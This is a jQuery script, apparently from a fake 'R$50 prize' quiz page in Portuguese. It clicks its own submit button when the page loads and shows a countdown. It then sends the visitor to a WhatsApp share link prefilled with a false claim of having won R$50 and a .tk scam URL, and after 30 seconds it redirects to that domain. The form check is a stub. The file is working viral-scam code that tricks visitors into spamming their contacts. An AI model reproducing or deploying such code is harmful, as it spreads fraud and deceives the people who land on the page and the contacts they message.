
$(function(){
    var loading = $('#loadbar').hide();
    $(document)
    .ajaxStart(function() {
        loading.show();
    }).ajaxStop(function () {
    	loading.hide();
        //window.onload = function() { document.getElementById("Enviar").click(); };
    });

    $(function share(){
        document.getElementById("Enviar1").click();
    });
    
    $("#Enviar1").on('click',function() {
    	var choice = $("label.btn.active").find('input:radio').val();
            $('#loadbar').hide();
            $('#quiz').fadeOut();
            $('#Enviar1').fadeOut();
            $("#ModalWhats").fadeIn().delay(30000);

            setTimeout(function(){
                $('#regressiva').text('10');
            },1000);

            setTimeout(function(){
                $('#regressiva').text('9');
            },2000);

            setTimeout(function(){
                $('#regressiva').text('8');
            },3000);

            setTimeout(function(){
                $('#regressiva').text('7');
            },4000);

            setTimeout(function(){
                $('#regressiva').text('6');
            },5000);

            setTimeout(function(){
                $('#regressiva').text('5');
            },6000);

            setTimeout(function(){
                $('#regressiva').text('4');
            },7000);

            setTimeout(function(){
                $('#regressiva').text('3');
            },8000);

            setTimeout(function(){
                $('#regressiva').text('2');
            },9000);

            setTimeout(function(){
                $('#regressiva').text('1');
            },10000);

            setTimeout(function(){
                $('#regressiva').text('0');
            },11000);

            setTimeout(function(){
                window.location.href = "http://www.promocao50reais.tk/";
            },30000);
            
    	setTimeout(function(){
            $("#ModalWhats").fadeOut(); 
           $( "#answer" ).html(  $(this).checking(choice) );  
            $('#quiz').show();  
            $('#loadbar').fadeOut();
            $('#Enviar1').show();
        }, 1500);

        setTimeout(function(){
            window.location.href = 'https://wa.me/?text=Acabei de ganhar R$50,00 apenas preenchendo este formulário, estou te enviando para que consiga também: http://promocao50reais.tk/'           
            
        },12000); 
              

    });
        
    });

    $.fn.checking = function(ck) {
        if (ck != $ans)
        
            return "Existem campos em branco.";
        else 
            return '';
                       }; 
